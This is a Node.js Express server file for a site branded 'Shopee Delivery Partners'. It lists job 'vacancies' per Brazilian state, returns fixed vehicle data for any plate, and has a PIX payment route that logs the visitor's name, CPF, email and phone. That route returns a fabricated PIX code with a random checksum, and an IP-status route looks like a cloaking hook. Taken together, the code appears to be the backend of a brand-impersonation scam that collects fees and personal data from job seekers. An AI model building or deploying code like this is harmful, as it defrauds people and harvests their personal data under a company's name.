// Servidor de produção simples - build uma vez e serve estático
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const PORT = process.env.PORT || 5000;
const app = express();

// Middlewares essenciais
app.use(cors({
  origin: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

let buildComplete = false;
let buildError = null;

// Função para fazer build do frontend
function buildFrontend() {
  return new Promise((resolve, reject) => {
    console.log('🏗️ Iniciando build do frontend...');
    
    const buildProcess = spawn('npx', ['vite', 'build', '--outDir', 'dist/public'], {
      stdio: 'pipe'
    });

    let output = '';
    let errorOutput = '';

    buildProcess.stdout.on('data', (data) => {
      const text = data.toString();
      output += text;
      console.log('Build:', text.trim());
    });

    buildProcess.stderr.on('data', (data) => {
      const text = data.toString();
      errorOutput += text;
      console.log('Build Error:', text.trim());
    });

    buildProcess.on('close', (code) => {
      if (code === 0) {
        console.log('✅ Build concluído com sucesso!');
        buildComplete = true;
        resolve();
      } else {
        console.log('❌ Build falhou com código:', code);
        buildError = errorOutput || 'Build falhou';
        reject(new Error(buildError));
      }
    });

    // Timeout de 5 minutos para o build
    setTimeout(() => {
      buildProcess.kill();
      reject(new Error('Build timeout'));
    }, 300000);
  });
}

// Middleware para log
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Rotas da API
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'production',
    port: PORT,
    buildComplete,
    buildError
  });
});

app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

app.get('/api/vehicle-info/:placa', (req, res) => {
  const { placa } = req.params;
  console.log(`Consultando veículo: ${placa}`);
  
  const mockVehicleData = {
    MARCA: "VOLKSWAGEN",
    MODELO: "GOL",
    SUBMODELO: "1.0 MI",
    VERSAO: "CITY",
    ano: "2020",
    anoModelo: "2020",
    chassi: "9BWZZZ377VT004251",
    codigoSituacao: "0",
    cor: "BRANCA"
  };
  
  res.json(mockVehicleData);
});

app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  console.log('Enviando resposta de pagamento:', pixResponse);
  res.json(pixResponse);
});

// Middleware para APIs não encontradas
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Servir arquivos estáticos buildados
app.use(express.static(path.join(__dirname, 'dist/public'), {
  maxAge: '1d', // Cache por 1 dia
  etag: true
}));

// Rota para SPA (Single Page Application)
app.get('*', (req, res) => {
  const buildPath = path.join(__dirname, 'dist/public');
  const indexPath = path.join(buildPath, 'index.html');
  
  // Se build foi concluído e arquivo existe
  if (buildComplete && fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } 
  // Se houve erro no build
  else if (buildError) {
    res.status(503).type('html').send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners - Erro</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: white;
                padding: 3rem;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
                text-align: center;
                max-width: 500px;
                width: 90%;
            }
            h1 { color: #E83D22; }
            .error { background: #ffe6e6; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Shopee Delivery Partners</h1>
            <p>Erro no build da aplicação</p>
            <div class="error">
                <strong>Detalhes:</strong> ${buildError}
            </div>
            <button onclick="window.location.reload()">Tentar novamente</button>
        </div>
    </body>
    </html>
    `);
  }
  // Se build ainda não foi concluído
  else {
    res.type('html').send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners - Preparando</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: white;
                padding: 3rem;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
                text-align: center;
                max-width: 500px;
                width: 90%;
            }
            .loading {
                display: inline-block;
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #E83D22;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin-bottom: 2rem;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            h1 { color: #E83D22; }
            .progress {
                background: #f0f0f0;
                border-radius: 20px;
                padding: 3px;
                margin: 20px 0;
                overflow: hidden;
            }
            .progress-bar {
                background: linear-gradient(45deg, #E83D22, #FF6B4A);
                height: 20px;
                border-radius: 20px;
                animation: progress 5s ease-in-out infinite;
            }
            @keyframes progress {
                0% { width: 10%; }
                50% { width: 80%; }
                100% { width: 95%; }
            }
        </style>
        <script>
            function checkBuild() {
                fetch('/health')
                  .then(response => response.json())
                  .then(data => {
                    if (data.buildComplete) {
                      window.location.reload();
                    } else if (data.buildError) {
                      document.querySelector('.container').innerHTML = 
                        '<h1>Erro no Build</h1><p>' + data.buildError + '</p><button onclick="window.location.reload()">Tentar novamente</button>';
                    } else {
                      setTimeout(checkBuild, 3000);
                    }
                  })
                  .catch(() => setTimeout(checkBuild, 5000));
            }
            setTimeout(checkBuild, 5000);
        </script>
    </head>
    <body>
        <div class="container">
            <div class="loading"></div>
            <h1>Shopee Delivery Partners</h1>
            <p>Preparando sua aplicação React...</p>
            <div class="progress">
                <div class="progress-bar"></div>
            </div>
            <small>Fazendo build da aplicação. Isso pode levar alguns minutos.</small>
        </div>
    </body>
    </html>
    `);
  }
});

// Iniciar build e depois o servidor
async function initialize() {
  console.log('🚀 Iniciando servidor Heroku Simples...');
  
  // Iniciar servidor imediatamente para responder requisições
  const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor rodando na porta ${PORT}`);
    console.log(`📦 Iniciando build em background...`);
  });
  
  // Fazer build em background
  try {
    await buildFrontend();
    console.log('🎉 Aplicação pronta! Frontend buildado com sucesso.');
  } catch (error) {
    console.log('💥 Erro no build:', error.message);
    buildError = error.message;
  }
}

// Cleanup
process.on('SIGTERM', () => {
  console.log('Recebido SIGTERM, encerrando...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('Recebido SIGINT, encerrando...');
  process.exit(0);
});

// Inicializar
initialize();